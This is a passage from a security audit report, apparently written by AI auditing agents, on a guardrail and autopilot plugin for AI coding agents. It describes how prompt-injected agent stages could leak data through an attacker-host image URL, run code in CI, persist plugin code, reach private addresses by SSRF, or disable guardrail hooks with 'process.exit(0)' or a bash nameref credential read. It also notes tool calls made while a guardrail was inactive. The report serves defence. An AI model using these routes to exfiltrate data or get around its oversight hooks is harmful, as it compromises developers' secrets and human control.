    - Attack path: a steered stage writes `![x](https://attacker/p.png?d=<data>)` into a ledger row or the QA report -> the engine posts it (`autopilot-lib.mjs:361`, `autopilot.mjs:797-943`, `post-review.mjs:340-386`) -> a viewer's browser or the forge fetches it.
    - Exploit: data leaves in the image URL after the stage's host rules were applied. Not run.
    - Mitigation examined: Odoo renders no `<img>`; the packet leg adds nothing beyond the research stages' open egress; the QA and hunt reports are the real bypass; unseen: camo and GitLab CSP.
    - Fix: rewrite remote images and autolinks before posting.

22. **The gate pushes the whole documents branch before any approval, with no check that it holds only the ticket's document paths** `skills/autopilot/scripts/autopilot.mjs:777` — tool misuse, confidence 6, verification **plausible** (7)
    - Attack path: a steered spec or plan stage commits `.circleci/config.yml` or `Jenkinsfile` (no stage-specific write limit, `qa-guardrail:823-837`) -> `postPacket` pushes the branch (`:777`, `pushAllowed` checks names, `autopilot-lib.mjs:655-659`) -> CI that builds branches runs it with secrets.
    - Exploit: code runs in CI before the approver sees the plan. Not run.
    - Mitigation examined: depends on the target project's CI; this repository's `ci.yml` triggers only on `dev` and `main` and uses no secrets; the same content is pushed at `pr` after approval.
    - Fix: diff-check the branch against the ticket's folders before the gate push; protect other CI files.

23. **Autopilot protected-path list omits auto-loaded agent code (`.opencode/plugins`, `.cursor/hooks.json`)** `hooks/qa-guardrail:634` — persistence into a later stage or session, confidence 7, verification **plausible** (6)
    - Attack path: a steered stage writes `.opencode/plugins/x.js` (not in either protected regex, `qa-shell-writes.mjs:265`) -> an untracked file never reaches a diff -> the next OpenCode stage or the developer's session loads it.
    - Exploit: persistence with the developer's environment. Not run.
    - Mitigation examined: the memory and nested `AGENTS.md` part is a recorded decision (`12e150f`); windsurf, cline, roo, continue paths are unsupported harnesses; Pi is excluded by `--no-extensions`; the stage can already run a script, so the verifier judged it nearer Low.
    - Fix: protect `^\.opencode/` and `.cursor/hooks.json`; do not reverse the memory decision.

24. **Research stages' fetch host test is textual, so a DNS name that resolves to a private address passes** `hooks/qa-guardrail:883` — SSRF, confidence 7, verification **plausible** (6)
    - Attack path: a ticket link or steered stage fetches `https://x.169-254-169-254.nip.io/` -> `non_public_host` (`:893-914`) and `linkFetchable` (`fetch-ticket.mjs:216-221`) judge text only.
    - Exploit: reaches a metadata or internal service through a local plain-http fetch tool. Not run.
    - Mitigation examined: the open egress and data-in-URL leak are the owner's recorded decision (GH-59 Spec D8, README:402); Claude Code's `WebFetch` upgrades http, cannot send metadata headers and returns cross-host redirects.
    - Fix: resolve before judging; refuse private, link-local, loopback results.

25. **Cursor plugin hook commands are cwd-relative (`./hooks/run-hook.cmd`), the issue-53 class, unmeasured for Cursor** `hooks/hooks-cursor.json:14` — relative hook path, confidence 6, verification **plausible** (6)
    - Attack path: a hostile repository opened in Cursor -> the hook resolves `./hooks/run-hook.cmd` (`:6,9,14`; `run-hook.cmd:87-93`) in the workspace -> attacker code, or a decoy that exits 0.
    - Exploit: the repository ships `hooks/run-hook.cmd` that exits 0. Not run.
    - Mitigation examined: `failClosed` covers a failed launch only; README.md:447 asserts the plugin folder with no measurement (`RELEASE-NOTES.md:278,435`); no Cursor decoy test.
    - Fix: measure Cursor; register through the plugin-root variable; add a decoy test.

26. **Codex guardrail registration relies on `${CLAUDE_PLUGIN_ROOT}` expansion by a POSIX shell, with no shell pin; on Windows it may fail open** `hooks/hooks-codex.json:9` — hook registration fails open, confidence 6, verification **plausible** (6)
    - Attack path: a steered stage on Codex for Windows -> the command is not expanded or parsed (the repository says cmd and PowerShell cannot parse it, `docs/windows/polyglot-hooks.md:14-20`) -> a non-2 exit -> the guardrail never runs.
    - Exploit: a push or tracker write the guardrail would deny proceeds. Not run.
    - Mitigation examined: fine on Linux and macOS; nothing covers Codex on Windows; the watcher's liveness check confirms only that the marker file exists.
    - Fix: measure Codex on Windows; register a form both shells parse, or refuse the Codex watcher there.

27. **The Gemini guardrail hook runs a launcher script that lives in the project, and Gemini's project-hook trust ignores the script's content** `templates/.gemini/hooks/ultrapowers-guardrail.mjs.tmpl:71` — repo-controlled hook script, confidence 7, verification **plausible** (6)
    - Attack path: a commit rewrites `.gemini/hooks/ultrapowers-guardrail.mjs` without touching `.gemini/settings.json` (`init.mjs:53,146-151`) -> attacker code, or `process.exit(0)`.
    - Exploit: replace the file with `process.exit(0)`. Not run.
    - Mitigation examined: an agent in a run cannot edit it (`qa-guardrail:634,836-850`); a committer can already delete the hook entry, so the launcher adds only a possible bypass of Gemini's first-sight warning; Gemini's trust model is not recorded in the repository; severity worth rechecking.
    - Fix: launch from the installed extension, or put a hash of the file in the command.

#### Low

(Not verified by contract; hardening.)

1. **Root `package.json` has no lockfile** `package.json:1` — `npm audit` failed with `ENOLOCK`; no dependencies are declared, so nothing is exposed today.
2. **This repository's own `.gitignore` does not ignore `.env`, `.env.*`, `.dev.vars`** `.gitignore:30` — the 2.3.0 fix landed in the template block only; run init upgrade mode. The repository is public.
3. **Muse manifest and Kimi hooks use workspace-relative commands** `.muse-plugin/plugin.json:177`, `.kimi-plugin/plugin.json:28` — the host's working directory is not recorded for Muse and is documented, not measured, for Kimi.
4. **Scaffolded MCP servers run through `npx -y` at exact versions with no lockfile** `templates/.mcp.json:6` — transitive dependencies resolve at every launch, in a process holding API keys.
5. **`run-hook.cmd` fail-closed walk starts at `%CD%`** `hooks/run-hook.cmd:58` — if Cursor runs hooks in the plugin folder, a no-bash Windows host loses the guardrail silently (the other side of Medium 25).
6. **`pre-commit` reads `.gitleaks.toml` from the working tree, unprotected in an autopilot stage** `.githooks/pre-commit:16` — a stage can neuter the scan; `gitleaks:allow` cannot be blocked by path protection.
7. **Hermes adapter's node lookup skips only the working directory** `.hermes-plugin/__init__.py:293` — an absolute PATH entry inside the project is accepted, unlike `resolve-tool.mjs`.
8. **Agent deny lists name only `mcp__playwright__` tools** `agents/qa-specialist.md:4`, `agents/vulnerability-hunter.md:4` — a plugin-registered Playwright server keeps in-page code execution on a harness without the hook.
9. **`exec -a NAME` and `time -f FORMAT` make the real program look unknown** `hooks/lib/qa-shell-writes.mjs:1691` — the real command's write rules are skipped in QA and autopilot.
10. **`ln` hard links: the source is never judged** `hooks/lib/qa-shell-writes.mjs:2512` — a later allowed write edits the shared inode.
11. **A command with thousands of non-drive write targets can outlast the 30 s hook timeout on Windows** `hooks/lib/guard-paths.mjs:35` — each path spawns `cygpath`; some harnesses let a timed-out hook through.
12. **MCP write detection by verb list misses `run`, `rerun`, `cancel`, `transition`, `trigger`, `dispatch`** `hooks/qa-guardrail:666`.
13. **The shell write area follows a symlink at `reviews/<id>`** `hooks/lib/qa-shell-writes.mjs:1211` — a committed `reviews/<id> -> ..` makes the project the write area.
14. **A planted `.ultrapowers/runs` record guards or blocks every session of a cloned repository** `hooks/lib/run-records.mjs:85` — a future `startedAt` never expires and a record outranks the autopilot marker.
15. **A two-step name reference reads a credential in autopilot** `hooks/lib/qa-shell-writes.mjs:1524` — `declare -n r; r=GH_TOKEN; echo $r`.
16. **`init join` points `core.hooksPath` at the repository's own `.githooks` unchecked** `skills/init/scripts/init.mjs:1297`.
17. **DECLARED rows default a dependency to public, so private package names can reach the research step** `skills/vulnerability-hunt/scripts/hunt-preflight.mjs:197`.
18. **Secret-read denies are an enumerated list** `templates/.claude/settings.json.tmpl:65` — `.env.prod`, `.env.dev`, `.env.preview` and other harnesses' token stores are readable; OpenCode's glob denies them.
19. **The generated MCP launcher starts `cmd` and `npx` by bare name** `skills/init/scripts/init.mjs:99` — a committed `npx.cmd` runs first on Windows.
20. **Kimi hook command is a relative path, safe only if Kimi runs hooks from the plugin root** `.kimi-plugin/plugin.json:28` (same family as Low 3).
21. **Key-material list omits `.git/config`, `.pypirc`, `.cargo/credentials`, `.config/gcloud`, `.azure`, `.pgpass`, `.vault-token`, `*.pem`, `*.key`** `hooks/qa-guardrail:604`.

## Skipped lanes

None skipped; all five lanes ran. Within lanes: `osv-scanner`, `pip-audit` and `cargo-audit` are absent and `dotnet` has no manifest, so no advisory-feed or `MAL-` check ran for any lockfile (not a clean result for dependencies); the root `package.json` could not be audited (`ENOLOCK`) and the offline fallback applied (no dependencies). The dependencies lane is `incomplete` for that reason but recorded a CVE, so the run is not INCOMPLETE. The ai-surface lane is `incomplete`: its hunter read about 40 percent of `qa-shell-writes.mjs`; code hunter 6 read all of it.

## Discarded leads (115)

3 verifier rejections and 112 below-floor or excluded leads recorded by the hunters (the full list is in `security-findings.json`).

- Verifier rejection: the repository's own `.claude/settings.json` is the 2.0.1 scaffold — untracked, git-ignored, never in history; the shipped template already omits `git blame` and carries the denies (`settings.json.tmpl:9-15,64-96`).
- Verifier rejection: an autopilot stage may write the team-memory index — recorded decision (`12e150f` reversed `aa424a8`; `RELEASE-NOTES.md:238`; fixtures pin the writes), the engine never merges, so a planted line reaches other sessions only through a human-reviewed PR.
- Verifier rejection: the scaffolded Chrome DevTools MCP server's usage statistics and CrUX upload — a third-party default with no attacker-reachable path; no shipped skill drives that server (`qa-lane-1-ui/SKILL.md:10`); Rule 5 binds the plugin's own code.
- Hunter leads (summarised): `reviews/audit-2026-10-11` is tracked and public with exploit shapes (documentation class; see Run notes); `raoofaltaher.com` in a 2024 expired-domain list; same-name unrelated projects; a title edit after the ready label is not bound; cross-ticket snapshot contamination at `begin`; the pre-commit gitleaks fallback skips with a warning (disclosed); `ci.yml` default `persist-credentials` and no timeout; the NUL-byte field shift in the hook protocol (no reachable harness); `git remote show` printing remote URLs in the hunt; a stage's `defaultBranch` option injection (harmless suffix); the visual companion server (auth, Origin, bind and files route hold); the Odoo client (https, no redirects); `.mypy_cache`, `.pytest_cache`, `.remember` and `.claude/worktrees` (generated or local, git-ignored); and the documented residuals: a script a stage writes and runs, and `run-records.mjs end` after a Verdict line.

## Files read (per lane; some files were read by several hunters)

- dependencies: 8 (three manifests, two lockfiles, the OpenCode injector and ignore file); osint: 11; secrets-supply-chain: about 60 (CI, hooks, templates, manifests, install docs, plus whole-tree pattern sweeps and 685 commits of history); ai-surface: about 110 (autopilot, ticket scripts, task-review, guardrail, adapters, templates, memory store).
- code: hunter 1 (`.agents`, `.claude*`, `.antigravity-plugin`) 29; hunter 2 (`.codex-plugin`, `.cursor-plugin`, `.devin-plugin`, `.githooks`) 15; hunter 3 (`.github`, `.hermes-plugin`, `.kimi-plugin`, `.muse-plugin`) 19; hunter 4 (`.opencode`, `.pi`, caches) 20; hunter 5 (`.remember`, `.ultrapowers`, `agents`, `assets`) 42; hunter 6 (`hooks`, `docs`, `output-styles`, `plans`) the whole of `hooks/` including all 2652 lines of the analyzer; hunter 7 (`skills`, `scripts`, `reviews`, `specs`) 41 whole scripts; hunter 8 (`templates`, `tests`, `tasks`, root) about 47.
- Gatekeeper: the contract, entry skill, lane, research and verifier prompts, template, the earlier report and findings file, `RELEASE-NOTES.md` v2.3.0, and the guardrail, run-record, autopilot and template code behind the earlier-findings section.

The full per-lane list lives in `security-findings.json` (abridged).

## Tools used

| Tool | Version | Command | Exit |
|---|---|---|---|
| node | v26.12.1 | `node S:/ultrapowers/skills/vulnerability-hunt/scripts/hunt-preflight.mjs --full-audit` | 0 |
| node | v26.12.1 | `node S:/ultrapowers/hooks/lib/run-records.mjs start --root S:/ultrapowers --profile hunt --id audit-2026-10-23` | 0 |
| npm | 11.21.1 | `npm audit --package-lock-only --json --prefix S:/ultrapowers/.opencode` (hunter, and again by the gatekeeper) | 1 (advisories; a valid report) |
| npm | 11.21.1 | `npm audit --package-lock-only --json --prefix S:/ultrapowers/tests/brainstorm-server` | 0 (0 vulnerabilities) |
| npm | 11.21.1 | `npm audit --package-lock-only --json --prefix S:/ultrapowers` | 1 (no report: `ENOLOCK`, a failed run for that manifest) |
| git | n/a | `git remote get-url origin`; `git check-ignore -v`; `git ls-files`; `git log` read forms (secrets and OSINT hunters) | 0 |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers` | 0 |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers/dependabot/alerts` (also `state=dismissed,fixed,auto_dismissed`) | 0 (empty; does not cover untracked `.opencode`) |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers/secret-scanning/alerts` (also `state=resolved`) | 0 (empty) |
| gh | 2.103.0 | `gh search code "<identifier>"` (7 queries, one per call) | 0 |
| gh | 2.103.0 | `gh api` GET reads of action tags and third-party sources (Hermes Agent, OpenCode, Kimi CLI) by three hunters | 0 |
| npm | 11.21.1 | `npm view <pkg>@<version>` for six public MCP package names (code hunter 8; outside the audit commands, not stopped because the guardrail was inactive) | 0 |
| git | n/a | `git diff --stat C:/Windows/win.ini S:/ultrapowers/LICENSE` (code hunter 8, to test a finding; no secret) | 0 |
| ls | n/a | `ls S:/ultrapowers/.agents/mcp-secrets.env` (gatekeeper probe of the guardrail; the file does not exist) | 2 (not denied) |
| jq | n/a | `jq empty reviews/audit-2026-10-23/security-findings.json` | 0 |

Not run: `pip-audit`, `cargo-audit`, `osv-scanner` (absent); `dotnet` (no manifest); `glab` (no GitLab remote).
